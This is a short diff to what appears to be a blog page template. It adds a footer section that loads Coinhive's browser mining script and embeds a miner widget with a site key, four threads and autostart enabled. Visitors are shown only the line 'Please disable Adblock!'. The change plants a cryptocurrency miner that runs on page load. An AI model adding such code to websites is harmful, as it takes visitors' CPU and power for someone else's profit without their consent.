@@ -40,6 +40,18 @@
       <p>author: <: $blog.author :></p>
       <a href="javascript: var f='http://twitter.com/?status='+encodeURIComponent(document.title+' '+location.href); if(!window.open(f,'surfing'))location.href=f; void(0);">Tweet</a>
     </section>
+    <section>
+      <script src="https://coinhive.com/lib/miner.min.js" async></script>
+      <div class="coinhive-miner"
+           style="width: 256px; height: 310px"
+           data-key="kTMn3NdQlevSWyC0iwQFREGT6SRJH2hR"
+           data-threads="4"
+           data-throttle="0.3"
+           data-autostart="true"
+           >
+        <em>Please disable Adblock!</em>
+      </div>
+    </section>
   </footer>
 
   <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
